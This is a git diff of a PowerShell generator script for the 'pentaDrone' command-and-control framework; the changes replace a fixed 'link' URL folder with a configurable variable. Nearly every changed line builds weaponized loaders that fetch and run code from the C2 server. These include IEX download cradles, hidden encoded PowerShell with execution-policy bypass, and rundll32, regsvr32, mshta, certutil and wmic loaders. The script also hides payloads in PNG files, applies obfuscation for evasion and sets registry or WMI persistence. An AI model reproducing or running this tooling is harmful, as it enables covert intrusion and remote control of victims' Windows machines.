@@ -1,5 +1,9 @@
 # Generator v3.0 
 # Generate pentaDrone Offensives Assets
+#  - by @thebenygreen - @eyesopensec
+# 
+########################################################
+
 Write-Host "Reading parameters from 'config.ini' file..." -ForegroundColor DarkGreen;
 Get-Content ".\config.ini" | ForEach-Object -Begin {$settings=@{}} -Process {$store = [regex]::split($_,'='); if(($store[0].CompareTo("") -ne 0) -and ($store[0].StartsWith("[") -ne $True) -and ($store[0].StartsWith("#") -ne $True)) {$settings.Add($store[0], $store[1])}}
 If (Test-Path  .\Output){ Remove-Item -path .\Output }
@@ -134,7 +138,7 @@ while ($t -eq $False) { #check internet connexion before continue (wait until in
 			echo "$c2c - EMPTY !!! "	
 			Start-Sleep -Seconds 5
 			if ($c2c){
-				[string]$enc = (cmd /c echo {IEX ((New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/link/pnt.ps1"))}).split(' ')[1] 
+				[string]$enc = (cmd /c echo {IEX ((New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/$linkfolder/pnt.ps1"))}).split(' ')[1] 
 			break	}
 		}
 	break}
@@ -142,7 +146,7 @@ while ($t -eq $False) { #check internet connexion before continue (wait until in
 Start-Sleep -Seconds 3
 
 
-(get-content .\zxd.ps1) | foreach-object {$_ -replace "ROOT_FOLDER", "$rootfolder" -replace "SERVER_IP_ADDRESS", "$c2c" } | set-content .\zxd.ps1	
+(get-content .\zxd.ps1) | foreach-object {$_ -replace "ROOT_FOLDER", "$rootfolder" -replace "SERVER_IP_ADDRESS", "$c2c" -replace "LINK_FOLDER", "$linkfolder" } | set-content .\zxd.ps1	
 Start-Sleep -Seconds 2
 Import-Module .\zxd.ps1
 [string]$enc = zxd_generateEncoded
@@ -158,11 +162,7 @@ Import-Module .\obfuscator\CleanComments.ps1
 CleanComments -Path .\agent_pnt.ps1| set-content .\agent_pnt.ps1
 CleanComments -Path .\appdat.ps1 | set-content .\appdat.ps1
 
-#CleanComments -Path .\agent.ps1 | set-content .\agent.ps1
-#CleanComments -Path .\agent_pnt.ps1| set-content .\agent_pnt.ps1
-#CleanComments -Path .\appdat.ps1 | set-content .\appdat.ps1
-
-(get-content .\agent.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "UPGRADEPOWERSHELL", "$upgradepshell" -replace "ROOT_FOLDER", "$rootfolder" -replace "MYOPS", "$ops" -replace "SLPTM1", "$sleeptime1" -replace "SLPTM2", "$sleeptime2" -replace "SLPTM3", "$sleeptime3" -replace "ENDDATE", "$enddate" -replace "WORKSTART", "$workstart" -replace "WORKEND", "$workend" -replace "KEYUPLOAD", "$keyupload" -replace "KEYUPLOAD", "$keyupload2"  -replace "AUTOPERSIST", "$autopersist"  -replace "DEFAULTPERSIST", "$defaultpersist" -replace "REGKEY", "$regkey"  -replace "WMIKEY", "$wmikey"  -replace "MYENCODED", "$enc" -replace "C2CHANNEL", "$c2channel" } | set-content .\temp.ps1
+(get-content .\agent.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "UPGRADEPOWERSHELL", "$upgradepshell" -replace "ROOT_FOLDER", "$rootfolder"  -replace "LINK_FOLDER", "$linkfolder" -replace "MYOPS", "$ops" -replace "SLPTM1", "$sleeptime1" -replace "SLPTM2", "$sleeptime2" -replace "SLPTM3", "$sleeptime3" -replace "ENDDATE", "$enddate" -replace "WORKSTART", "$workstart" -replace "WORKEND", "$workend" -replace "KEYUPLOAD", "$keyupload" -replace "KEYUPLOAD", "$keyupload2"  -replace "AUTOPERSIST", "$autopersist"  -replace "DEFAULTPERSIST", "$defaultpersist" -replace "REGKEY", "$regkey"  -replace "WMIKEY", "$wmikey"  -replace "MYENCODED", "$enc" -replace "C2CHANNEL", "$c2channel" } | set-content .\temp.ps1
 CleanComments -Path .\temp.ps1| set-content .\payload.ps1
 #get-content .\temp.ps1 | set-content .\payload.ps1
 set-content .\temp.ps1 -Value ""
@@ -239,7 +239,7 @@ return $encoding.GetString($h,0,$h.Length);
 }
 Out-EncryptedScript .\payload.ps1 $passcrypt $thatsalt
 
-(get-content .\agent_pnt.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "ROOT_FOLDER", "$rootfolder" -replace "PASSCRYPT", "$passcrypt" -replace "SALT", "$thatsalt" } | set-content .\c2c\pnt.ps1
+(get-content .\agent_pnt.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "ROOT_FOLDER", "$rootfolder" -replace "LINK_FOLDER", "$linkfolder" -replace "PASSCRYPT", "$passcrypt" -replace "SALT", "$thatsalt" } | set-content .\c2c\pnt.ps1
 $Pnt_Direct_Attack = Out-EncodedCommand -Path .\c2c\pnt.ps1 -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput
 set-content .\c2c\pnt-Encoded.bat -Value "powershell -exec bypass -Nol -Win Hidden -Enc $Pnt_Direct_Attack"
 Write-Host "Encoded > \c2c\pnt-Encoded.bat"
@@ -412,7 +412,7 @@ r = new ActiveXObject("WScript.Shell").Run(c,0,true);
 Out-JS -Payload "PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc" -OutputPath .\js\style.js
 copy .\js\style.js .\c2c
 $runjs = @"
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){}h.Open("GET","$c2c/$rootfolder/link/style.js",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){}h.Open("GET","$c2c/$rootfolder/$linkfolder/style.js",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
 "@
 set-content .\js\stylejs.bat -Value $runjs
 
@@ -481,7 +481,7 @@ Set-Item Variable:/P0 'Net.WebClient';SI Variable:EJk '$PayloadURL';dir ect*;Set
 #Out-SCT -Payload "PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc"  -OutputPath .\sct\KB0985412
 Out-SCT -OutputPath .\sct\KB0985412
 copy .\sct\KB0985412 .\c2c
-$sctfile = "regsvr32.exe /u /n /s /i:$c2c/$rootfolder/link/KB0985412 scrobj.dll"
+$sctfile = "regsvr32.exe /u /n /s /i:$c2c/$rootfolder/$linkfolder/KB0985412 scrobj.dll"
 echo $sctfile > .\sct\sct.bat
 
 Write-Host "Weaponized SCT file "
@@ -516,7 +516,7 @@ Write-Host "Weaponized LNK file "
 
 function Out-Certutil {
 	$Certutil = @"
-certutil -urlcache -split -f $c2c/$rootfolder/link/pnt.bat %temp%\p.bat
+certutil -urlcache -split -f $c2c/$rootfolder/$linkfolder/pnt.bat %temp%\p.bat
 start %temp%\p.bat 
 "@
 	set-content .\bat\certutil.bat -Value $Certutil
@@ -526,7 +526,7 @@ Write-Host "Weaponized CERTUTIL file "
 	
 function Out-Mshta {
 	$mshta = @"
-mshta.exe javascript:a=(GetObject("script:$c2c/$rootfolder/link/KB0985412")).Exec();close();
+mshta.exe javascript:a=(GetObject("script:$c2c/$rootfolder/$linkfolder/KB0985412")).Exec();close();
 "@
 	set-content .\bat\mshta.bat -Value $mshta
 	}
@@ -535,7 +535,7 @@ Write-Host "Weaponized MSHTA file "
 	
 function Out-RunDll {
 	$rundll = @"
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:$c2c/$rootfolder/link/KB0985412").Exec();
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:$c2c/$rootfolder/$linkfolder/KB0985412").Exec();
 "@
 	set-content .\bat\rundll.bat -Value $rundll
 	}
@@ -568,7 +568,7 @@ version="1.0">
 "@
 	set-content .\c2c\wmic.xsl  -Value $xsl
 	$wmic = @"
-wmic os get /format:"$c2c/$rootfolder/link/wmic.xsl"
+wmic os get /format:"$c2c/$rootfolder/$linkfolder/wmic.xsl"
 "@
 	set-content .\bat\wmic.bat -Value $wmic
 	}
@@ -579,7 +579,7 @@ function Out-PNG {
 Import-Module .\stego.ps1
 echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > .\bat\pnt.ps1
 Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath .\$evilimage -ImageDestinationPath .\png\$evilimage -PayloadSource Text -PayloadPath .\bat\pnt.ps1
-Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath $c2c/$rootfolder/link/$evilimage -PayloadSource Text -PayloadPath .\png\InfectWithPNG.txt
+Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath $c2c/$rootfolder/$linkfolder/$evilimage -PayloadSource Text -PayloadPath .\png\InfectWithPNG.txt
 }
 Out-PNG
 Write-Host "Weaponized PNG file : $evilimage"
@@ -587,7 +587,7 @@ add-content ./stego.ps1 -Value "VAR_IMAGE_URL = Read-Host -Prompt 'Use your OWN 
 add-content ./stego.ps1 -Value "Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath VAR_IMAGE_URL -PayloadSource Text -PayloadPath .\InfectWithPNG.txt"
 
 function Out-Obfuscate {
-	Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/link/pnt.ps1")} -Command "$obfuscationToken .\bat\pnt-obfuscated.bat" -Quiet
+	Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/$linkfolder/pnt.ps1")} -Command "$obfuscationToken .\bat\pnt-obfuscated.bat" -Quiet
 	Write-Host "Obfuscate > \bat\pnt-obfuscated.bat"
 	cscript.exe .\obfuscator\vbs_obfuscator.vbs .\vbs\agent.vbs > .\vbs\agent_obfuscated.vbs
 	}
@@ -614,7 +614,7 @@ Write-Host "."
 Write-Host "."
 
 Import-Module .\obfuscator\Invoke-CradleCrafter.psd1
-$cradle = Invoke-CradleCrafter -Url "$c2c/$rootfolder/link/pnt.ps1" -Command 'Memory\*\All\1' -Quiet  
+$cradle = Invoke-CradleCrafter -Url "$c2c/$rootfolder/$linkfolder/pnt.ps1" -Command 'Memory\*\All\1' -Quiet  
 set-content .\c2c\pnt-secured-iex.ps1 -Value $cradle
 Write-Host "CradleCrafter > \c2c\pnt-secured-iex.ps1"
 
